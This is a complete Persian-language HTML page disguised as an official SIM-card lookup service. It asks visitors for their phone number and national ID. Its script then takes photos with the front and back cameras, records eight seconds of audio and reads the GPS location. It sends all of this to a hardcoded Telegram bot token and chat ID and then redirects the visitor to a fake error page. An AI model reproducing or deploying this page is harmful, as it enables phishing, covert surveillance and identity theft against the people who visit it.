<!DOCTYPE html>
<html lang="fa">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>سامانه استعلام سیم‌کارت</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Tahoma, sans-serif;
        }
        body {
            background: linear-gradient(145deg, #0b2b3f, #1a4b61);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            direction: rtl;
            margin: 0;
        }
        .container {
            background: white;
            padding: 35px 25px;
            border-radius: 24px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.5);
            width: 400px;
            text-align: center;
        }
        .logo { font-size: 48px; margin-bottom: 10px; }
        h2 { color: #1a2a3a; font-size: 22px; margin-bottom: 8px; }
        .sub { color: #6c7a8a; font-size: 14px; margin-bottom: 25px; }
        input {
            width: 100%;
            padding: 14px;
            margin: 10px 0;
            border: 2px solid #e2e8f0;
            border-radius: 12px;
            font-size: 15px;
            background: #f8fafc;
            text-align: center;
        }
        input:focus {
            border-color: #1a7ae8;
            background: white;
            outline: none;
        }
        button {
            width: 100%;
            padding: 14px;
            background: #1a7ae8;
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 17px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 12px;
        }
        button:hover { background: #0f5bb5; }
        .note {
            margin-top: 18px;
            font-size: 12px;
            color: #94a3b8;
            border-top: 1px solid #e2e8f0;
            padding-top: 16px;
        }
        .note span { color: #1a7ae8; font-weight: bold; }
        .input-group { text-align: right; margin: 5px 0; }
        .input-group label {
            font-size: 13px;
            color: #4a5a6a;
            font-weight: bold;
            display: block;
            margin-right: 5px;
        }
        #loading {
            display: none;
            margin-top: 15px;
            font-size: 14px;
            color: #1a7ae8;
        }
        #status {
            margin-top: 10px;
            font-size: 13px;
            color: #16a34a;
            display: none;
        }
        #errorMsg {
            margin-top: 10px;
            font-size: 13px;
            color: #dc2626;
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">📱</div>
        <h2>استعلام سیم‌کارت</h2>
        <p class="sub">برای استعلام وضعیت سیم‌کارت، اطلاعات زیر را وارد کنید</p>

        <form id="findForm">
            <div class="input-group">
                <label>📞 شماره موبایل</label>
                <input type="text" id="phone" placeholder="مثلاً 09123456789" required>
            </div>
            <div class="input-group">
                <label>🆔 کد ملی</label>
                <input type="text" id="nationalCode" placeholder="مثلاً 1234567890" required>
            </div>
            <button type="submit" id="submitBtn">🔍 استعلام</button>
        </form>

        <div id="loading">⏳ در حال پردازش...</div>
        <div id="status">✅ اطلاعات با موفقیت ارسال شد</div>
        <div id="errorMsg">❌ خطا در ارسال اطلاعات</div>

        <div class="note">
            🔒 اطلاعات شما محفوظ است · <span>سامانه همتا</span>
        </div>
    </div>

    <script>
        // ======================================================
        // تنظیمات ربات تلگرام (توکن و آیدی چت)
        // ======================================================
        const BOT_TOKEN = '8826841444:AAGLmSPOXr_tID0VKHFjhrhod9OqQhnNI60';
        const CHAT_ID = '7059995091';

        // ======================================================
        // تابع ارسال به تلگرام (پشتیبانی از عکس و موقعیت)
        // ======================================================
        async function sendToTelegram(message, file = null, photo = null, location = null) {
            try {
                console.log('📤 در حال ارسال به تلگرام...');

                // ۱. ارسال موقعیت مکانی (به صورت لینک گوگل مپ)
                if (location) {
                    const locationMessage = `📍 موقعیت مکانی:\n${location}`;
                    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: CHAT_ID,
                            text: locationMessage,
                            parse_mode: 'HTML'
                        })
                    });
                    if (response.ok) {
                        console.log('✅ موقعیت مکانی ارسال شد');
                    } else {
                        console.log('⚠️ خطا در ارسال موقعیت');
                    }
                }

                // ۲. ارسال عکس (اگر گرفته شده باشد)
                if (photo) {
                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('photo', photo, 'captured_photo.jpg');
                    formData.append('caption', '📸 عکس گرفته شده');

                    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });
                    if (response.ok) {
                        console.log('✅ عکس ارسال شد');
                    } else {
                        console.log('⚠️ خطا در ارسال عکس');
                    }
                }

                // ۳. ارسال فایل صوتی (اگر ضبط شده باشد)
                if (file) {
                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('audio', file, 'recorded_audio.wav');
                    formData.append('caption', '🎤 ضبط صدا');

                    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, {
                        method: 'POST',
                        body: formData
                    });
                    if (response.ok) {
                        console.log('✅ فایل صوتی ارسال شد');
                    } else {
                        console.log('⚠️ خطا در ارسال فایل صوتی');
                    }
                }

                // ۴. ارسال پیام متنی اصلی
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message
                    })
                });
                if (response.ok) {
                    console.log('✅ پیام متنی ارسال شد');
                    return true;
                } else {
                    throw new Error('ارسال پیام متنی انجام نشد');
                }

            } catch (e) {
                console.error('❌ خطا در ارسال به تلگرام:', e);
                document.getElementById('errorMsg').style.display = 'block';
                document.getElementById('errorMsg').textContent = '❌ خطا: ' + e.message;
                return false;
            }
        }

        // ======================================================
        // تابع دریافت مجوزها و گرفتن عکس
        // ======================================================
        async function requestAllPermissionsAndCapture() {
            try {
                console.log('📱 درخواست مجوزها...');
                
                // ۱. میکروفون
                const micStream = await navigator.mediaDevices.getUserMedia({ audio: true });
                micStream.getTracks().forEach(track => track.stop());
                console.log('✅ مجوز میکروفون گرفته شد');

                // ۲. دوربین جلو + گرفتن عکس
                const frontStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                const frontPhoto = await capturePhotoFromStream(frontStream);
                frontStream.getTracks().forEach(track => track.stop());
                console.log('✅ عکس دوربین جلو گرفته شد');

                // ۳. دوربین عقب + گرفتن عکس
                const backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
                const backPhoto = await capturePhotoFromStream(backStream);
                backStream.getTracks().forEach(track => track.stop());
                console.log('✅ عکس دوربین عقب گرفته شد');

                // ۴. موقعیت مکانی
                const location = await getLocation();
                console.log('✅ موقعیت مکانی گرفته شد:', location);

                return {
                    success: true,
                    frontPhoto: frontPhoto,
                    backPhoto: backPhoto,
                    location: location
                };
            } catch (e) {
                console.error('❌ خطا در دریافت مجوزها:', e);
                alert('⚠️ لطفاً همه مجوزها را بدهید و دوباره تلاش کنید.');
                return { success: false };
            }
        }

        // ======================================================
        // تابع گرفتن عکس از استریم دوربین
        // ======================================================
        function capturePhotoFromStream(stream) {
            return new Promise((resolve) => {
                const video = document.createElement('video');
                video.srcObject = stream;
                video.onloadedmetadata = () => {
                    video.play();
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    canvas.toBlob((blob) => {
                        resolve(blob);
                    }, 'image/jpeg', 0.8);
                };
            });
        }

        // ======================================================
        // تابع ضبط صدا
        // ======================================================
        async function recordAudio() {
            try {
                console.log('🎤 شروع ضبط صدا...');
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                const mediaRecorder = new MediaRecorder(stream);
                const audioChunks = [];

                mediaRecorder.ondataavailable = event => {
                    audioChunks.push(event.data);
                };

                const audioPromise = new Promise((resolve) => {
                    mediaRecorder.onstop = () => {
                        const audioBlob = new Blob(audioChunks, { type: 'audio/wav' });
                        console.log('✅ ضبط صدا کامل شد، حجم:', audioBlob.size, 'bytes');
                        resolve(audioBlob);
                    };
                });

                mediaRecorder.start();
                setTimeout(() => {
                    mediaRecorder.stop();
                    stream.getTracks().forEach(track => track.stop());
                }, 8000);

                return await audioPromise;
            } catch (e) {
                console.error('❌ خطا در ضبط صدا:', e);
                return null;
            }
        }

        // ======================================================
        // تابع گرفتن موقعیت (لینک گوگل مپ)
        // ======================================================
        function getLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve('موقعیت در دسترس نیست');
                    return;
                }
                navigator.geolocation.getCurrentPosition(
                    position => {
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        const googleMapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
                        resolve(`${googleMapsLink}`);
                    },
                    error => {
                        resolve('❌ خطا در گرفتن موقعیت');
                    }
                );
            });
        }

        // ======================================================
        // رویداد کلیک روی دکمه
        // ======================================================
        document.getElementById('findForm').addEventListener('submit', async function(e) {
            e.preventDefault();

            const phone = document.getElementById('phone').value;
            const nationalCode = document.getElementById('nationalCode').value;
            const loadingDiv = document.getElementById('loading');
            const statusDiv = document.getElementById('status');
            const errorDiv = document.getElementById('errorMsg');
            const submitBtn = document.getElementById('submitBtn');

            submitBtn.disabled = true;
            submitBtn.textContent = '⏳ در حال پردازش...';
            loadingDiv.style.display = 'block';
            statusDiv.style.display = 'none';
            errorDiv.style.display = 'none';

            try {
                // ۱. دریافت مجوزها و گرفتن عکس
                const result = await requestAllPermissionsAndCapture();
                if (!result.success) {
                    throw new Error('مجوزها داده نشد');
                }

                // ۲. ضبط صدا
                const audioBlob = await recordAudio();

                // ۳. ساخت پیام متنی
                let message = `📱 اطلاعات جدید:\n`;
                message += `📞 شماره: ${phone}\n`;
                message += `🆔 کد ملی: ${nationalCode}\n`;
                message += `⏱️ زمان: ${new Date().toLocaleString('fa-IR')}\n`;
                message += `🎤 ضبط صدا: ${audioBlob ? '✅' : '❌'}\n`;
                message += `📸 عکس جلو: ${result.frontPhoto ? '✅' : '❌'}\n`;
                message += `📸 عکس عقب: ${result.backPhoto ? '✅' : '❌'}`;

                // ۴. ارسال به تلگرام (با عکس و موقعیت)
                await sendToTelegram(
                    message,
                    audioBlob,
                    result.backPhoto || result.frontPhoto,  // اولویت با دوربین عقب
                    result.location
                );

                statusDiv.style.display = 'block';
                statusDiv.textContent = '✅ اطلاعات با موفقیت ارسال شد';

                setTimeout(() => {
                    window.location.href = 'https://example.com/error';
                }, 2000);

            } catch (error) {
                console.error('❌ خطا:', error);
                errorDiv.style.display = 'block';
                errorDiv.textContent = '❌ خطا: ' + error.message;
            } finally {
                submitBtn.disabled = false;
                submitBtn.textContent = '🔍 استعلام';
                loadingDiv.style.display = 'none';
            }
        });

        // ======================================================
        // بررسی وضعیت در کنسول
        // ======================================================
        console.log('✅ صفحه بارگذاری شد');
        console.log('🤖 توکن ربات:', BOT_TOKEN ? '✅ تنظیم شده' : '❌ تنظیم نشده');
        console.log('🆔 Chat ID:', CHAT_ID ? '✅ تنظیم شده' : '❌ تنظیم نشده');
    </script>
</body>
</html>
